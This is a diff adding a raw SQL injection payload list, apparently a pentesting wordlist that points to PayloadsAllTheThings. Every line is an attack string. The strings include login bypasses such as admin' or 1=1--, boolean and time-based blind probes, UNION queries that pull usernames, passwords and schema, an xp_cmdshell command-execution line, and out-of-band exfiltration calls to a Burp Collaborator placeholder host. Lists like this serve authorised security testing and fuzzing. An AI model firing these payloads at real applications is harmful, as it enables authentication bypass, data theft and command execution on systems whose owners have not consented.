@@ -1,0 +1,240 @@
+**Further:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+0' or '0' = '0
+1' or '1' = '1
+' OR '1'='1
+' or 1=1 limit 1 --
+1 AND 1=1 --
+1 AND 1=2 --
+1 AND LENGTH(@@hostname)=1 --
+1 AND LENGTH(@@hostname)=2 --
+1 AND LENGTH(@@hostname)=N --
+1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
+1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --
+' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A --
+' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -
+' AND SLEEP(5)/*
+' AND '1'='1' AND SLEEP(5)
+' ; WAITFOR DELAY '00:00:05' --
+BENCHMARK(2000000,MD5(NOW()))
+1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+1; EXEC xp_cmdshell('whoami') --
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+' union select 0x2720756e696f6e2073656c65637420312c3223#
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
+"anything' UNION SELECT Username, Password FROM Users;--"
+"P@ssw0rd"
+1%09and%091=1%09--
+1%0Aand%0A1=1%0A--
+1%0Band%0B1=1%0B--
+1%0Cand%0C1=1%0C--
+1%0Dand%0D1=1%0D--
+1%A0and%A01=1%A0--
+1%A0and%A01=1%A0--
+1/*comment*/AND/**/1=1/**/--
+1/*!12345UNION*//*!12345SELECT*/1--
+(1)and(1)=(1)--
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+' OORR 1<2 #
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+' and 1='1
+' and a='a
+ or 1=1
+ or true
+' or ''='
+" or ""="
+1′) and '1′='1–
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ or 0=0 --
+ or 0=0 #
+ or 0=0 –
+' or         0=0 #
+' or 0=0 --
+' or 0=0 #
+' or 0=0 –
+" or 0=0 --
+" or 0=0 #
+" or 0=0 –
+%' or '0'='0
+ or 1=1
+ or 1=1--
+ or 1=1/*
+ or 1=1#
+ or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1--
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1′
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1–
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1′='1–
+) or ('1′='1–
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+"or 1=1 or ""="
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+' and 'x'='x
+admin' or 1=1;-- 
+?id=1' order by 1 --+
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+'+||+1=1#
+')waitfor delay'0:0:10'--
+(select(0)from(select(sleep(10)))v)
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
+%2b(select*from(select(sleep(10)))a)%2b
